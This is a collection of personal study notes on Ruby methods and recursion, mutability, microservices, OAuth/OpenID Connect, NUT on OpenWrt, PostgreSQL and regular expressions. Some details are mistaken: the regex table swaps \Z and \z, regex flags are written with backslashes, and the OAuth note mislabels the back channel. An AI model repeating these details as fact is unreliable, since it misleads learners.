  puts 'Bonjour'
end
```

The notion of "outer" or "inner" scope doesn't translate within a method
definition: parameters _must_ be passed to the method definition (see
Method Invocation below).

## Method Invocation

Method invocation is the act of calling a method we defined previously, or an
existing method form the Ruby Core API or Core Library, somewhere in our code.

A method can be invoked as is or by passing one or several argument.

```ruby
def greeting(name)        # Method defined with one parameter
  puts "Bonjour #{name}"
end

greeting('Petit Prince')  # Method invocation with one argument
```

Important note while we are here:

{.ui .info .message}
Methods are defined with **parameters** but they are invoked with
**arguments**. (cf., [[parameter-argument]]#)

The example above is invoking a method we previously defined. We could also
invoke an already existing Ruby method:

```ruby
[1, 2, 3].each { |n| puts n }
# 1
# 2
# 3
```

The method above is called with a block. That `do..end` (or `{..}`) block
following the method invocation is actually an argument being passed into the
method, like the `'Petit Prince'` string above.

Technically every method can be called with a block but the method needs to be
constructed in a certain way to be able to execute the block. See [[method-with-block-at-invocation]]#

The important point regarding block is: a block is _part_ of the method
invocation and method invocation is actually the way to define a block! (cf.,
[[part-of-code-block-or-not]]#)

When a block is passed to a method that use the return value of said block, we
can do more than just executing what is inside the block.

```ruby
a = 'Baguette'

[1, 2, 3].map { |n| a }
# => ["Baguette", "Baguette", "Baguette"
```

We replaced `Array#each` with `Array#map` which uses the return value of the
block to perform a transformation. Interestingly, `#map` does not have access
to variable `a` _but_ the block delimited by `{..}` _can_. As the block returns
`a` to `#map`, the later can now use the value of `a`!

## Method and Scopes

Method definition **sets** a scope for local variable while method invocation
**uses** the scope set by method definition.

### Blocks Inside Method Definition

The rules of [[local-variable-scope]]# for block inside a method definition **do**
translate.


===

<!-- Source: computing/software/microservices.md -->
<!-- URL: /computing/software/microservices -->
<!-- Title: Microservices -->
<!-- Wikilinks: [[computing/software/microservices]], [[software/microservices]], [[microservices]] -->

---
date: 2021-12-18T13:06
---

Microservices
=============

What is a Microservices?
------------------------

One way to understand microservices is to describe what they are *not*.

### What is *not* a Microservice?

A typical but fairly big web application constitutes of a **load
balancer** that will takes [[http-protocol]] (or HTTPS) requests and
sends them to the appropriate **host** (Linux or otherwise). The server
application's configuration varies from company to company but a
standard configuration consists of an Apache **reverse proxy** and a
Tomcat **server** that runs the **monolithic application**. This
application is directly connected to a Oracle (for example) **database**
(maybe using JDBC in the case of Java) that stores the information. This
database may also be connected with other databases such as a billing
database, etc.

In this configuration, the code base of the application is
**monolithic**: everybody is contributing to one code base that got
deployed regularly.

One problem with this approach is that when a change that cause problems
was introduced, it is difficult to diagnose because as many different
updates are being introduced, it's difficult to pin down the cause of
the problem.

Same with the database which is just one machine taking every data. If
it went down, everything went down with it.

A last problem is that the architecture is tightly coupled, or deeply
interconnected.

### What *is* a Microservice?

> … the microservice architecture style is an approach to developing a
> single application as a suite of small services, each running in its
> own process and communicating with lightweight mechanisms, often an
> HTTP resource API.
>
> ```{=html}
> <footer>—Martin Fowler</footer>
> ```

Microservices can also be thought of as an evolutionary response to the
problems described above.

-   Separation of concerns
    -   Microservices encourage modularity, encapsulation in order to
        not have to deal with the coordination between each layers.
-   Scalability
    -   Horizontally scaling (with a correct approach)
    -   Workload partitioning
-   Virtualization & elasticity (microservices work better this way
    because…)
    -   We need to be able to automate operations as much as possible
    -   On demand provisioning

Microservices are an **abstraction**.

A service client will hit one of the service which will itself look for
data in a database. At some point it is wise to front all this with a
cache (Client) to accelerate things. To orchestrate the different steps,
one need a Client Library that will check the cache first, then hit the
service client if it can't find the information in cache. The services
also need to update the cache for the next time the information is
needed. All this (Client Library, Cache Client, Service Client and
Database) constitute the microservice from the client application's
perspective.

[Source](https://www.youtube.com/watch?v=CZ3wIuvmHeM)


===

<!-- Source: computing/software/mutable-and-immutable-objects.md -->
<!-- URL: /computing/software/mutable-and-immutable-objects -->
<!-- Title: Mutable and Immutable Objects -->
<!-- Wikilinks: [[computing/software/mutable-and-immutable-objects]], [[software/mutable-and-immutable-objects]], [[mutable-and-immutable-objects]] -->

---
date: 2021-01-12T09:14
---

# Mutable and Immutable Objects

Objects can be _mutable_ or _immutable_. The former can be changed, the latter
cannot. In Ruby, **numbers, boolean values and `nil`** are immutable. Strings are
mutable, unlike in Java or Python.

While we should only encounter numbers and boolean values as immutable object
at this stage, it is good to know that every oject in Ruby can be rendered
immutable using the `#freeze` method. We can also use the `#frozen?` method to
check if current object the variable is referencing is frozen or not
(immutable/rendered immutable or not).

```ruby
irb:001> str = '42'
=> "42"
irb:002> str.frozen? # String object are not immutable
=> false
irb:003> str.freeze  # Prevent further modifications of `str`
=> "42"
irb:004> str.frozen?
=> true
irb:005> 42.frozen?  # Numbers are
=> true
```

Immutable objects are usefull for threading or encapsulation (those concepts
need Zettel on their own).


===

<!-- Source: computing/software/mutation-in-arrays.md -->
<!-- URL: /computing/software/mutation-in-arrays -->
<!-- Title: Mutation in Arrays -->
<!-- Wikilinks: [[computing/software/mutation-in-arrays]], [[software/mutation-in-arrays]], [[mutation-in-arrays]] -->

---
date: 2021-02-25T21:20
---

# Mutation in Arrays

To understand mutation in arrays, first we need to review [[variables-as-pointers]] and
especially the **Mutability** section.

When applied to Arrays (or collections), mutability can have be the source of
headaches. We will use `Array#object_id` to see what is going on under the
hood.

```ruby
# Initialize a first Array object and dup it to initialize a second one
array1 = ["一", "二", "三"]
array2 = array1.dup

# Their object ID are different. Nothing special here
array1.object_id     # => 240
array2.object_id     # => 260

# The object ID of both array's first element are the same
array1[0].object_id  # => 280
array2[0].object_id  # => 280

# Let's mutate the second element of array1
array1[1] << '円'    # => "二円"

# Both array's second element are updated
puts array1[1]       # => 二円
puts array2[1]       # => 二円

# They still have the same object ID
array1[1].object_id  # => 320
array2[1].object_id  # => 320

# They are still two different array, though
array1.object_id     # => 240
array2.object_id     # => 260
```

Instead of `Array#dup` we could have use a simple assignement. The results
would have been the same except the object ID of `array1` and `array2` would
have been the same.

What happened is that while both arrays are different object thanks to the
`Array#dup` method, their elements points to the same address in memory.
Modifying an element in one array will "affect" the same element in the other
array.

Let's imagine a scenario where you initialize a local variable to an element of
an array, in order to use later in the code. However, before using the array
you mutate the element in the array:

```ruby
animals = ['flamingo', 'red panda']

fancy_bird = animals[0]

animals[0].clear

# Do a bunch of things here...

puts "The #{fancy_bird} is pink!" # => The  is pink!
```

While the code above is silly, it gets more confusing when introducing methods
to the mix because of [[ruby-pass-by-reference-of-the-value]].

For example, given the following methods' implementation, will the returned
object be the same object as the one passed in as an argument or a different
object?

```ruby
# Method to reverse the letters in a string
def spin_me(str)
  str.split.each(&:reverse!).join(" ")
end

str = 'hello world'
puts str.object_id
puts spin_me(str).object_id
```

```ruby
# Method to reverse the letters in strings contained in an array
def spin_me(arr)
  arr.each(&:reverse!)
end

arr = ['hello', 'world']
puts arr.object_id
puts spin_me(arr).object_id
```

(The answer is different object for the first method and same object for the
second.)


===

<!-- Source: computing/software/nut-openwrt.md -->
<!-- URL: /computing/software/nut-openwrt -->
<!-- Title: NUT on OpenWrt -->
<!-- Wikilinks: [[computing/software/nut-openwrt]], [[software/nut-openwrt]], [[nut-openwrt]] -->

---
date: 2020-08-03
tags:
  - openwrt
  - nut
  - nas
---

# NUT on OpenWrt

Here are the steps I took to set up NUT at home between a NAS (server) and an Openwrt router (client).

First, on the **NUT server**, make sure it is set with `MODE=netserver`.

Next, add the folowing directive for the client:

In `/etc/nut/upsd.conf` you should add

```
LISTEN 192.168.1.2 #IP of the client
```

Next, on the **client**:

Make sure you have installed `nut-client` which is the useful package for this use case.

Inside `/etc/nut/nut/nut.conf`, make sure there is `MODE=netclient`.

In `$HOMEBREW/nut/config/nut-monitor` (or something similar) you should have the following rules:

```
config slave
   option upsname ups
   option hostname 192.168.1.1
   option username upsmon
   option password secret
```

Replace `upsname`, `hostname`, `username` and `password` with the settings on the NUT server (thoses should be in `/etc/nut/upsd.user`).

Type `upsmon -D` in the terminal of the client and check for errors (may need to stop it first as it can't start more than one time).

This should generate the `/etc/nut/upsmon.conf` file.

Some docs says to use `upsdrvctl -t shutdown`. It didn't work on my system but good to know to try to simulate a shutdown (without actually powering off).

If everything work so far, try the next command (make sure to save all works as this will power off the client):

`upsmon -c fsd`

NUT should be set up now.


===

<!-- Source: computing/software/oauth-openid-connect.md -->
<!-- URL: /computing/software/oauth-openid-connect -->
<!-- Title: OAuth 2.0 and OpenID Connect -->
<!-- Wikilinks: [[computing/software/oauth-openid-connect]], [[software/oauth-openid-connect]], [[oauth-openid-connect]] -->

---
date: 2021-12-18T16:51
---

OAuth 2.0 and OpenID Connect
============================

**OAuth 2.0** is for **authorization** while **OpenID Connect** is for
**authentication**.

OAuth 2.0
---------

{.ui .warning .message}
While there is a OAuth 1.0, it is deprecated and 2.0 should be used
every time.

OAuth 2.0 is a **delegated authorization** services. At a high level, it
works as follows:

1.  An application will integrate a "Connect with *website\_name*"
    button
2.  On click, the user browser will redirect over to that website and
    they will be prompted to login (email and password). With the
    redirection, the callback URL, response type and scope(s) are
    specified
3.  After successful login, the website will ask something along the
    line of "Allow *application* to access *whatever\_info*?" with a
    yes/no call to action. This is important: explicit consent is key
4.  If the user click "yes", the browser redirects back to the first
    application **callback** or **redirect URI** with an authorization
    code.
5.  The application use the authorization code to ask the website for an
    access token.
6.  The website check the authenticity and validity of the authorization
    token and exchange it with an access token.
7.  Now the application contacts the website's API and ask for
    *whatever\_info* by presenting the authorization token thing that
    let the website knows the application is allowed to access this
    information.

OAuth is a **authorization** service. However, starting with Google or
Facebook login button, it also became an authentication service, which
it wasn't designed for at first. This implementation introduces problem
because there is no standard way to get user's information and every
implementation and scopes are different.

### Terminology

OAuth 2.0 uses confusing terminologies that just renames things that are
already named.

-   Resource owner: you and me (the user who clicks on "yes" or "no" and
    who owns the data)
-   Client: the application that want to access the data
-   Authorization server: the website the user is redirected to allow
    the sharing of the data
-   Resource server: the server with the API or system that actually
    *holds* the data (not always the same as the authorization server)
-   Authorization grant: the "special magic thing" to prove the user
    consented to share the data
-   Redirect URI: where the browser should go back at the end of the
    consent dance executed beforehand
-   Access token: the actual token or key needed to access the data for
    which permission was granted, on the resource server
-   Scopes/Consents: a list of scopes that the authorization server
    understands. A list of permissions that make sense for this system

The reason there is two tokens (authorization grant and access token) is
because of network security concepts called *back channel* (highly
secure channel) and *front channel* (less secure channel).

Most of the OAuth ceremony occurs on the back channel, i.e., between the
browser and a website. In the case where there is only an authorization
grant, and if the network or the browser is compromised (via malicious
extension for example), an attacker could potentially grab the
authorization grant and claim the data before you.

The access token, however, can only be claimed on a back channel. In
addition to the authorization grant, the server also sends a secret key
that only the client (server) knows. This is to let the resource server
knows that this client did not steal the authorization grant. This
secret key never goes to the front channel.

There exist an **implicit flow** which does not require an authorization
grant. In this case, the client asks for the token directly. It is less
secure for the reason cited above and should not be used if there is a
way to use the back channel (it is mainly used by single page
application with no back end).

OpenID Connect
--------------

As OAuth 2.0 was not designed to do authentication, some smart people
added a little bit of whatever OAuth is missing for doing proper
authentication use case. Out of that effort comes **OpenID Connect**.

OpenID Connect adds:

-   ID token: represents the user or the information about the user
-   UserInfo endpoint for getting more user information: used to
    retrieve user information
-   Standard set of scopes
-   Standardized implementation

The authorization flow is similar to OAuth 2.0's; the only difference is
as a `Scope` we ask for `openid profile`. Technically it's both a OAuth
2.0 request and OpenID Connect request.

The ID token is A JSON web token (JWT) which is a standard way of
encoding a bunch of information in a way that's easy to transmit over
the internet. It can be decoded to reveal a header, a payload (or claim)
and a signature. The signature is a way to verify the payload has not
been modified or forged before reception.


===

<!-- Source: computing/software/pairwise-testing.md -->
<!-- URL: /computing/software/pairwise-testing -->
<!-- Title: Pairwise (All-Pair) Testing -->
<!-- Wikilinks: [[computing/software/pairwise-testing]], [[software/pairwise-testing]], [[pairwise-testing]] -->

---
date: 2020-12-23T20:36
---

# Pairwise (All-Pair) Testing

Pairwsie testing (or all-pair testing) is used to test every possible discrete
combinaison of values.

The goal is to reduce the number of test to its minimum will still behing
exhaustive, and this before the end of the world (or before your company runs
out of money).

Creating pairwise combination is possible by hand but it's also a field where
computer excels so better let them do that.

A great tool to create pairwise combination is [PICT](https://github.com/Microsoft/pict), or _Pairwise
Independent Combinatorial Testing_ by Microsoft.

Sources:
* http://www.pairwise.org/
* https://www.javatpoint.com/all-pairs-testing-technique-in-black-box-testing



===

<!-- Source: computing/software/parameter-argument.md -->
<!-- URL: /computing/software/parameter-argument -->
<!-- Title: Parameter vs Argument -->
<!-- Wikilinks: [[computing/software/parameter-argument]], [[software/parameter-argument]], [[parameter-argument]] -->

---
date: 2020-09-26T14:43
---

# Parameter vs Argument

Those two terms are often used interchangeably but we want to be precise when
describing concepts like how parameters work and how argument are passed.

A **parameter** is the variable used during the **method definition**.

An **argument** is the actual value of this variable that gets passed to the
method during **method invocation**.

```ruby
def my_method(my_parameter)
  # Do stuff
end

my_argument = "I'm an argument!"
my_method(my_argument)
```


## Mnemonic Tips

Glanned by yours truly around the Cyberspace:

* **A**rgument are **A**ctual.
* You _define_ parameters and you _make_ arguments.[^1]
* _You can think of the **p**arameter as a **p**arking space and the
  **a**rgument as an **a**utomobile. Just as different automobiles can park in
  a parking space at different times, the calling code can pass a different
  argument to the same parameter every time that it calls the procedure._[^2]


[^1]: [What's the difference between an argument and a parameter?](https://stackoverflow.com/a/156787)
[^2]: [Differences Between Parameters and Arguments (Visual Basic)](https://docs.microsoft.com/en-us/dotnet/visual-basic/programming-guide/language-features/procedures/differences-between-parameters-and-arguments)


===

<!-- Source: computing/software/pass-by-reference-pass-by-value.md -->
<!-- URL: /computing/software/pass-by-reference-pass-by-value -->
<!-- Title: Pass by Reference vs Pass by Value -->
<!-- Wikilinks: [[computing/software/pass-by-reference-pass-by-value]], [[software/pass-by-reference-pass-by-value]], [[pass-by-reference-pass-by-value]] -->

---
date: 2020-08-07
tags:
  - programming
---

# Pass by Reference vs Pass by Value

The terms **Pass by Reference** and **Pass by Value** are two _object passing
strategies_[^1] used to explain what a programming language do when objects are
passed to methods.

The former treats the passed objects as "references" to the original object,
while the later treats them as "values" (new copies of the original).

See also: [[variables-as-pointers]]

## Pass by Reference

When you "pass by reference", the method has a _reference_, in other word a pointer to the location of the passed object. In that case, modifying the object inside the method actually modify the original, referenced object.


## Pass by Value

When you "pass by value", the method only has a _copy_ of the original object.
In other word, the original object is not affected by what happens to the
object within the method.


[^1]: Object passing strategies are _strict_ [evaluation strategies](https://en.wikibooks.org/wiki/Introduction_to_Programming_Languages/Evaluation_Strategies). Another evalution strategy is _lazy_ evaluation.


===

<!-- Source: computing/software/postgresql.md -->
<!-- URL: /computing/software/postgresql -->
<!-- Title: PostgreSQL -->
<!-- Wikilinks: [[computing/software/postgresql]], [[software/postgresql]], [[postgresql]] -->

---
date: 2022-03-25T11:35
---

PostgreSQL
==========

[PostgreSQL](https://www.postgresql.org/) is a famous
[[relational-database-management-system]]. It is an open-source
"client-server" database which can be accessed using a programming
language, through a GUI application or a CLI.

Client Applications
-------------------

One strength of PostgreSQL is its packaged of "client applications".
These are used to interact with PostgreSQL in various ways by issuing a
command via the command line.

Some commonly used client applications:

-   `createdb`: wrapper around `CREATE DATABASE` SQL command, to create
    a new PostgreSQL database
-   `dropdb`: wrapper around `DROP DATABASE` SQL command, to destroys an
    existing PostgreSQL database
-   `pg_dump`: utility for consistently backing up a PostgreSQL database
    into a script file or other archive file (even when currently in
    use)
-   `pg_restore`: utility for restoring a PostgreSQL database from an
    archive file created by `pg_dump`
-   `pg_bench`: program for running benchmark tests on PostgreSQL
-   `psql`: terminal-based interactive console to interact with
    PostgreSQL

Client applications are to be used *within* one's terminal and not in
PostgreSQL interactive console (`psql`).

The `psql` Console Prompt
-------------------------

In the `psql` console prompt, one can issue two types of commands:

-   Meta-commands: backslash `\` followed by a command and optional
    arguments (like `\q` to quit)
-   SQL statements: commands issued to the database using SQL syntax
    (and terminating in a semi-colon)

[Source](https://launchschool.com/books/sql/read/interacting_with_postgresql)

Common PSQL Meta-Commands
-------------------------

-   `\connect database_name` (or `\c database_name`) to connect to the
    database called `database_name`
-   `\list` (or `\l`) to display all databases
-   `\quit` (or `\q`) to exit PostgreSQL session
-   `\edit` (or `\e`) to call an editor that let's you edit and rerun
    the previous command
-   `\dt` to display a list of all the existing tables
-   `\d foo` to describe the table `foo`


===

<!-- Source: computing/software/recursion-factorial.md -->
<!-- URL: /computing/software/recursion-factorial -->
<!-- Title: Understanding Recursion (Factorial) -->
<!-- Wikilinks: [[computing/software/recursion-factorial]], [[software/recursion-factorial]], [[recursion-factorial]] -->

---
date: 2020-08-30T17:35
---

# Understanding Recursion (Factorial)

Fibonacci sequence is often used to explain recursion (see [[recursion-fibonacci]]) but
recursion may actually be easier to understand.

## Recursion

In mathematics, recursion is described as follow:

> The factorial of a positive integer $n$ denoted $n!$ is the product of all
> positive integers less than or equal to $n$.


The sequence can be written like this:

$$
n! =
  \begin{cases}
    1             & \quad \text{, } n = 0 \\
    n * (n - 1)!  & \quad \text{, } n > 0
  \end{cases}
$$


The beginning of the sequence is thus:

> 1, 1, 2, 6, 24, 120, 720, 5 040, 40 320, 362 880, 3 628 800, 39 916 800...


## How it Translates in Programming

Using a recursion, we can easily write a factorial:

```ruby
def factorial(n)
  return 1 if n == 1
  n * factorial(n - 1)
end
```

The recursion is on line three.

Trying to translate the behavior of `factorial(3)` ($3!$) step by step:

```txt
Call factorial(3):
  Line 3: 3 * factorial(2)

  Call factorial(2):
    Line 3: 2 * factorial(1)

    Call factorial(1):
      Line 2: this time n == 1
      factorial(1) returns 1

    Back in factorial(2) call
    Line 3: 2 * factorial(1) = 2 * 1
    Return 2

  Back in factorial(2) call
  Line 3: 3 * factorial(2) = 3 * 2
  Return 6

Back in factorial(3) call which returns 6
```


This behavior is the same as calling multiple method and using its return
value:

```ruby
def factorial1
  1
end

def factorial2
  2 * factorial1
end

def factorial3
  3 * factorial2
end
```



===

<!-- Source: computing/software/recursion-fibonacci.md -->
<!-- URL: /computing/software/recursion-fibonacci -->
<!-- Title: Understanding Recursion (Fibonacci Sequence) -->
<!-- Wikilinks: [[computing/software/recursion-fibonacci]], [[software/recursion-fibonacci]], [[recursion-fibonacci]] -->

---
date: 2020-08-30T09:23
---

# Understanding Recursion (Fibonacci Sequence)

Recursion can be tricky even for experienced developers. I'll try to explain to
the best of my understanding how it works using the usual suspect: _the
Fibonacci sequence_.


## Fibonacci Sequence

In mathematics, the Fibonacci sequence is described as follow:

> Fibonacci sequence is a sequence of numbers where each subsequent number is
> the sum of the previous two numbers in the sequence, except for the first two
> numbers, namely 0 and 1.


The sequence can be written like this:

$$
F_{n} =
  \begin{cases}
    0                & \quad \text{, } n = 0 \\
    1                & \quad \text{, } n = 1 \\
    F_{n-1} + F_{n-2}  & \quad \text{, } n > 1
  \end{cases}
$$


The beginning of the sequence is thus:

> 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144...


## How it Translates in Programming

We can write this sequence in Ruby using a recurion, like the code shown below.

```ruby
def fibonacci(n)
  return 1 if n <= 2
  fibonacci(n - 1) + fibonacci(n - 2)
end
```

The conundrum is on line three, when the method calls itself twice on the same
line.

This is what is called **recursion**: a method or function which calls itself
until a return condition is reached.

In the code above, the exit condition is on line two: `if n <= 2`.

Let's look at what happens when we `n = 3` ($F_{3}$):

We know that $F_{3} = F_{2} + F_{1}$ ; let's see how it works:

$$
\begin{split}
  F_{3} = F_{2} + F_{1}           \\
  F_{3} = (F_{1} + F_{0}) + F_{1} \\
  F_{3} = (1 + 0) + 1             \\
  F_{3} = 2
\end{split}
$$


### Summary

* The final return value of the requested Fibonacci number comes from the last
  line of our code: `fibonacci(n - 1) + fibonacci(n - 2)`.
* The line `return if n <= 2` is executed only during the recursion when
  $F_{n} > 1$ is to be calculated.
* The method needs to know what the previous two answers ($F_{n-1}$ and
  $F_{n-2}$) are before behing able to calculate $F_{n}$. In other words, in
  every case the procedure works its way down to `n == 1` and then builds the
  final result with each return.
* The Fibonacci joke is worse than the last two jokes you heard, combined.


See also [[tail-recursion]].


===

<!-- Source: computing/software/recursive-methods.md -->
<!-- URL: /computing/software/recursive-methods -->
<!-- Title: Recursive Methods -->
<!-- Wikilinks: [[computing/software/recursive-methods]], [[software/recursive-methods]], [[recursive-methods]] -->

---
date: 2020-08-30T18:05
---

# Recursive Methods

Recursive methods is a method in which it calls itself.

Recursive methods have three primary qualities:

1. They call themselves at least once
2. They have a condition that stops the recursion
3. They use the result return by themselves

For example:

```ruby
def sum(n)
  return 1 if n == 1  # 2. Stopping condition
  n + sum(n - 1)      # 1. Calls itself, 3. Uses the return result
end
```


See also:

* [[recursion-factorial]]#
* [[recursion-fibonacci]]#
* [[tail-recursion]]#


===

<!-- Source: computing/software/regex.md -->
<!-- URL: /computing/software/regex -->
<!-- Title: Regular Expressions -->
<!-- Wikilinks: [[computing/software/regex]], [[software/regex]], [[regex]] -->

---
date: 2020-08-01
tags:
  - programming/regex
---

# Regular Expressions

Regular Expressions (regex) are **patterns** that we can use to search for
information of interest in a set of strings[^1].

This zettel is specific about Ruby and Jacascript regex. When it is not
specified, it uses Ruby's version of regex.


## Regex Documentation

* [Ruby Doc](https://ruby-doc.org/core-2.7.0/Regexp.html)
* [MDN web docs (Javascript)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp)


## Online regex editor

* [Rubular (Ruby)](https://rubular.com/)
* [Scriptular (Javascript)](https://scriptular.com/)


## Portals

* [[basic-regex]]#
* [[regex-options]]#
* [[regex-shortcuts]]#
* [[regex-anchors]]#
* [[regex-quantifiers]]#
* [[regex-miscellaneous]]#

[^1]: [Introduction to Regular Expressions by Launch School](https://launchschool.com/books/regex/read/introduction)


===

<!-- Source: computing/software/regex/basic-regex.md -->
<!-- URL: /computing/software/regex/basic-regex -->
<!-- Title: Basic Regex -->
<!-- Wikilinks: [[computing/software/regex/basic-regex]], [[software/regex/basic-regex]], [[regex/basic-regex]], [[basic-regex]] -->

---
date: 2020-08-02
tags:
  - programming/regex
---

# Basic Regex

## Special Characters

`$ ^ * + ? . ( ) [ ] { } | \ /`

The special characters or _meta-characters_ above needs to be escaped with `\`.

Some variants of regex have different meta-characters. It is good to be aware
of it.


## Alternation

Write two or more patterns separated by pipe `|` characters and surround the
entire expression in parentheses `()`.

Example: `/(red panda|flamingo|capybara)/`


## Set of Characters

Check a string against a set of characters by putting them inside brackets
`[]`.

It is good practice to group characters by type:
* digits
* uppercase letters
* lowercase letters
* whitespace
* non-alphanumeric characters

Non-alphanumerics group generally comes first of last in the character class,
for readability.

{.ui .warning .message}
_Inside a character class_, the number of special characters shrinks to the
following:
`^ \ - [ ]`


## Range of Characters

You can match a range of characters by putting a `-` between two characters in
the set of characters.

`/[0-9][A-F][a-f]/`


## Negated Classes

Negate a range by putting a caret `^` at the beginning of the range:

`/[^y]/`

This will highlight everything in a string, except `y`.


## Capture Groups

Capture groups, grouping surrended with parentheses `()`, let's you capture the
matching characters inside the parentheses.

These matches can be reused later in the same regex using **backreference**, a
sequence symbolized by `\1`, `\2,`, `\3`... through `\9`.

{.ui .info .message}
In Ruby, you can name groups and backreferences.


===

<!-- Source: computing/software/regex/regex-anchors.md -->
<!-- URL: /computing/software/regex/regex-anchors -->
<!-- Title: Regex Anchors -->
<!-- Wikilinks: [[computing/software/regex/regex-anchors]], [[software/regex/regex-anchors]], [[regex/regex-anchors]], [[regex-anchors]] -->

---
date: 2020-08-03
tags:
  - programming/regex
---

# Regex Anchors

<table class="ui celled table">
  <thead>
    <tr>
      <th>Anchors</th>
      <th>Meaning</th>
      <th>Language</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Anchors">^</td>
      <td data-label="Meaning">Fix regex match to the beginning of a line</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Anchors">$</td>
      <td data-label="Meaning">Fix regex match to the ending of a line</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Anchors">\A</td>
      <td data-label="Meaning">Fix regex match to the beginning of a string</td>
      <td data-label="Language">Ruby</td>
    </tr>
    <tr>
      <td data-label="Anchors">\Z</td>
      <td data-label="Meaning">Fix regex match to the ending of a string</td>
      <td data-label="Language">Ruby</td>
    </tr>
    <tr>
      <td data-label="Anchors">\z</td>
      <td data-label="Meaning">Fix regex match up to, but not including, a newline at the end of a string (prefer \Z when possible)</td>
      <td data-label="Language">Ruby</td>
    </tr>
    <tr>
      <td data-label="Anchors">\b</td>
      <td data-label="Meaning">Fix regex match to word boundaries</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Anchors">\B</td>
      <td data-label="Meaning">Fix regex match to non-word boundaries</td>
      <td data-label="Language"></td>
    </tr>
  </tbody>
</table>

See also [[regex-miscellaneous]]#


===

<!-- Source: computing/software/regex/regex-miscellaneous.md -->
<!-- URL: /computing/software/regex/regex-miscellaneous -->
<!-- Title: Regex Miscellaneous -->
<!-- Wikilinks: [[computing/software/regex/regex-miscellaneous]], [[software/regex/regex-miscellaneous]], [[regex/regex-miscellaneous]], [[regex-miscellaneous]] -->

---
date: 2020-08-02
tags:
  - programming/regex
---

# Regex Miscellaneous

* Once consumed as part of a match by the regex engine, a character is no longer available for subsequent matches.
* `\b` and `\B` do not work as word boundaries inside of character classes
  (`[]`).



===

<!-- Source: computing/software/regex/regex-options.md -->
<!-- URL: /computing/software/regex/regex-options -->
<!-- Title: Regex Options -->
<!-- Wikilinks: [[computing/software/regex/regex-options]], [[software/regex/regex-options]], [[regex/regex-options]], [[regex-options]] -->

---
date: 2020-08-02
tags:
  - programming/regex
---

# Regex Options

**Options**, also called **flags** or **modifiers**, are language dependent.
The example below uses Ruby syntax.

<table class="ui celled table">
  <thead>
    <tr>
      <th>Option Character</th>
      <th>Effect</th>
      <th>Language</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Option Character">\i</td>
      <td data-label="Effect">Ignore case</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Option Character">\m</td>
      <td data-label="Effect">Match multiline</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Option Character">\x</td>
      <td data-label="Effect">Write regex over several lines (ignore whitespace and comments in the pattern)</td>
      <td data-label="Language">Ruby</td>
    </tr>
  </tbody>
</table>


===

<!-- Source: computing/software/regex/regex-quantifiers.md -->
<!-- URL: /computing/software/regex/regex-quantifiers -->
<!-- Title: Regex Quantifiers -->
<!-- Wikilinks: [[computing/software/regex/regex-quantifiers]], [[software/regex/regex-quantifiers]], [[regex/regex-quantifiers]], [[regex-quantifiers]] -->

---
date: 2020-08-04
tags:
  - programming/regex
---

# Regex Quantifiers

Quantifiers lets you match sequences.


<table class="ui celled table">
  <thead>
    <tr>
      <th>Name</th>
      <th>Quantifier Character</th>
      <th>Effect</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Name">Zero or More</td>
      <td data-label="Quantifier Character">*</td>
      <td data-label="Effect">Matches zero or more occurrences of the pattern to its left</td>
    </tr>
    <tr>
      <td data-label="Name">One or More</td>
      <td data-label="Quantifier Character">+</td>
      <td data-label="Effect">Matches one or more occurrences of the pattern to its left</td>
    </tr>
    <tr>
      <td data-label="Name">Zero or One</td>
      <td data-label="Quantifier Character">?</td>
      <td data-label="Effect">Matches pattern that either occurs once or doesn't occur at all</td>
    </tr>
    <tr>
      <td data-label="Name">Ranges</td>
      <td data-label="Quantifier Character">p{m,n}</td>
      <td data-label="Effect">Matches matches `m` or more occurrences of `p`, but not more than `n` if provided</td>
    </tr>
  </tbody>
</table>

## Greediness vs. Laziness

The quantifiers above are **greedy**: they always match the longest possible
string they can.

Greediness is uselful most cases, but when you need to match the fewest number
of characters possible, we need to use a **lazy** match.

In Ruby and Javascript, lazy match are called with a `?` behind the maiin
quantifier.


[Further reading](https://launchschool.com/books/regex/read/quantifiers)


===

<!-- Source: computing/software/regex/regex-shortcuts.md -->
<!-- URL: /computing/software/regex/regex-shortcuts -->
<!-- Title: Regex Shortcuts -->
<!-- Wikilinks: [[computing/software/regex/regex-shortcuts]], [[software/regex/regex-shortcuts]], [[regex/regex-shortcuts]], [[regex-shortcuts]] -->

---
date: 2020-08-02
tags:
  - programming/regex
---

# Regex Shortcuts

<table class="ui celled table">
  <thead>
    <tr>
      <th>Shortcut</th>
      <th>Meaning</th>
      <th>Language</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Shortcut">\s</td>
      <td data-label="Meaning">Whitespace characters (\t, \v, \r, \n, \f)</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Shortcut">\S</td>
      <td data-label="Meaning">Non-whitespace characters</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Shortcut">\d</td>
      <td data-label="Meaning">Any decimal digit (0-9)</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Shortcut">\D</td>
      <td data-label="Meaning">Any character but a decimal digit</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Shortcut">\h</td>
      <td data-label="Meaning">Any hexadecimal digit (0-9, A-F, a-f)</td>
      <td data-label="Language">Ruby</td>
    </tr>
    <tr>
      <td data-label="Shortcut">\H</td>
      <td data-label="Meaning">Any character but a hexadecimal digit</td>
      <td data-label="Language">Ruby</td>
    </tr>
    <tr>
      <td data-label="Shortcut">\w</td>
      <td data-label="Meaning">Word characters (A-Z, a-z, 0-9, _)</td>
      <td data-label="Language"></td>
    </tr>
    <tr>
      <td data-label="Shortcut">\W</td>
      <td data-label="Meaning">Non-word characters</td>
      <td data-label="Language"></td>
    </tr>
  </tbody>
</table>


===

<!-- Source: computing/software/relational-database-management-system.md -->
<!-- URL: /computing/software/relational-database-management-system -->
<!-- Title: Relational DataBase Management System -->
